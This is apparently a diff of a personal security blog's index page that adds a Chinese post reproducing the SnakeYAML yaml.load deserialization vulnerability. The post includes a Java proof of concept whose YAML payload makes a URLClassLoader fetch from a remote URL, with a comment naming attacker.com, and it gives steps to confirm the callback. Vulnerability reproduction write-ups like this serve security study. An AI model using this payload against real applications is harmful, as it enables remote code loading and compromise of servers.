@@ -66,6 +66,64 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-yaml.load反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/27/yaml.load反序列化漏洞/" class="article-date">
+  <time datetime="2019-04-26T16:01:35.526Z" itemprop="datePublished">2019-04-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/27/yaml.load反序列化漏洞/">yaml.load反序列化漏洞复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <meta name="referrer" content="no-referrer">
+
+
+<h2 id="0x00-正常的使用方式"><a href="#0x00-正常的使用方式" class="headerlink" title="0x00 正常的使用方式"></a>0x00 正常的使用方式</h2><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line">public class Tester &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">	//正常的使用方式</span><br><span class="line">	String normal = &quot;key: hello yaml&quot;;</span><br><span class="line">	Yaml yaml = new Yaml();</span><br><span class="line">	Object obj = yaml.load(normal);</span><br><span class="line">	System.out.print(obj);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>注：所依赖的jar包的下载地址：<a href="http://www.java2s.com/Code/Jar/s/Downloadsnakeyaml17jar.htm" target="_blank" rel="noopener">Download snakeyaml-1.7.jar</a></p>
+<p>控制台的打印结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;key=hello yaml&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>可触发反序列化漏洞的PoC代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line">public class Tester &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">	//可触发反序列化漏洞的使用方式</span><br><span class="line">	String malicious = &quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader &quot;</span><br><span class="line">                + &quot;[[!!java.net.URL [\&quot;http://127.0.0.1:8000\&quot;]]]]&quot;;</span><br><span class="line">	Yaml yaml = new Yaml();            // Unsafe instance of Yaml that allows any constructor to be called.</span><br><span class="line">	Object obj = yaml.load(malicious); // Make request to http://attacker.com</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在该PoC中，被Yaml对象的load方法调用的“yaml字符串”是被精心构造的恶意代码。在该PoC的反序列化过程中，会向“<a href="http://127.0.0.1:8000”发起网络请求。" target="_blank" rel="noopener">http://127.0.0.1:8000”发起网络请求。</a></p>
+<p>复现步骤：<br>（1）搭建Python SimpleHTTPServer<br>如图所示：</p>
+<p><img src="//chenergy1991.github.io/2019/04/27/yaml.load反序列化漏洞/SimpleHTTPServer.png" alt="SimpleHTTPServer.png"></p>
+<p>（2）运行PoC，观察运行结果</p>
+<p>如图所示：</p>
+<p><img src="//chenergy1991.github.io/2019/04/27/yaml.load反序列化漏洞/visit.png" alt="visit.png"></p>
+<p>由图可知，SimpleHTTPServer受到了访问GEt请求，反序列化漏洞复现成功。</p>
+<h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><ul>
+<li><p>因为<a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">《Java反序列化漏洞从入门到深入》</a>这一博文，了解了YAML这一包含反序列化漏洞的第三方组件；</p>
+</li>
+<li><p><a href="https://lgtm.com/blog/swagger_snakeyaml_CVE-2017-1000207_CVE-2017-1000208" target="_blank" rel="noopener">《Arbitrary code execution via Swagger YAML parser (CVE-2017-1000207 and CVE-2017-1000208)》</a>对YAML的漏洞复现和防御有较好的讲解；</p>
+</li>
+<li><p>PyYAML这一第三方组件也有类似的问题。</p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/04/27/yaml.load反序列化漏洞/" data-id="cjuybg0rg00026wv1yj66ajbr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-ZrLog后台文件写入" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/04/24/ZrLog后台文件写入/" class="article-date">
@@ -119,7 +177,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/04/24/ZrLog后台文件写入/" data-id="cjuvdzd5h0002fwv1dczzf4zf" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/04/24/ZrLog后台文件写入/" data-id="cjuybg0rd00016wv1t8n05oly" class="article-share-link">Share</a>
       
       
     </footer>
@@ -187,7 +245,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/24/MyInformationSecurityBlog/" data-id="cjuvdzd5o0003fwv13s72o633" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/24/MyInformationSecurityBlog/" data-id="cjuybg0qx00006wv1xerxinoi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -274,7 +332,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/24/好的链接/" data-id="cjuvdzd5y0005fwv1fays3bu2" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/24/好的链接/" data-id="cjuybg0ro00066wv1zv47qsxp" class="article-share-link">Share</a>
       
       
     </footer>
@@ -329,7 +387,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/24/how-to-use-jad/" data-id="cjuvdzd5s0004fwv1q0i0phmg" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/24/how-to-use-jad/" data-id="cjuybg0rn00056wv1jhvfqudq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -421,7 +479,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/24/CVE-2018-1261/" data-id="cjuvdzd5d0001fwv1o7sz5nem" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/24/CVE-2018-1261/" data-id="cjuybg0rj00036wv1kcban695" class="article-share-link">Share</a>
       
       
     </footer>
@@ -602,7 +660,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/24/django-excel-tool/" data-id="cjuvdzd6i0006fwv1c1ubm7em" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/24/django-excel-tool/" data-id="cjuybg0sd00076wv1x2trw4yr" class="article-share-link">Share</a>
       
       
     </footer>
@@ -706,7 +764,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/24/CVE-2017-7275/" data-id="cjuvdzd510000fwv1bfa6bj8g" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/24/CVE-2017-7275/" data-id="cjuybg0rl00046wv1vz3ok25e" class="article-share-link">Share</a>
       
       
     </footer>
@@ -747,6 +805,10 @@
       <ul>
         
           <li>
+            <a href="/2019/04/27/yaml.load反序列化漏洞/">yaml.load反序列化漏洞复现</a>
+          </li>
+        
+          <li>
             <a href="/2019/04/24/ZrLog后台文件写入/">ZrLog后台文件写入</a>
           </li>
         
@@ -760,10 +822,6 @@
         
           <li>
             <a href="/2019/03/24/how-to-use-jad/">How to use JAD?</a>
-          </li>
-        
-          <li>
-            <a href="/2019/03/24/CVE-2018-1261/">CVE-2018-1261（Spring Integration Zip不安全解压漏洞）复现和分析</a>
           </li>
         
       </ul>
